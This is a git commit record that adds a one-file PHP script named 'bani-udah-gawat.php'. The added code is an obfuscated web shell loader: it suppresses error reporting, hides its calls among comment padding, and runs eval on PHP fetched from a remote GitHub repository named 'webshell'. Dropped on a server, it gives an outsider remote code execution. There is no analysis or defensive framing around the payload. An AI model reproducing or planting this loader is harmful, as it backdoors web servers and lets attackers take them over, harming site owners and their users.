df8d8efcf4b02a7e99c6c09c97306a8c5ee26d96
tominthesky <koitt.thomas@gmail.com>
2025-09-26 21:39:29 +0700

    bani-udah-gawat.php

---
+++ bani-udah-gawat.php
@@ -0,0 +1,2 @@
+<?=/****/@/*77777*/null; /******/@/*77777*/error_reporting(0);/****/@/*77777*/null; /******/@/*77777*/eval/******/("?>".file_get_contents("https://github.com/null7ganteng/webshell/raw/refs/heads/main/modules.php"))/******/ /**/?>
+
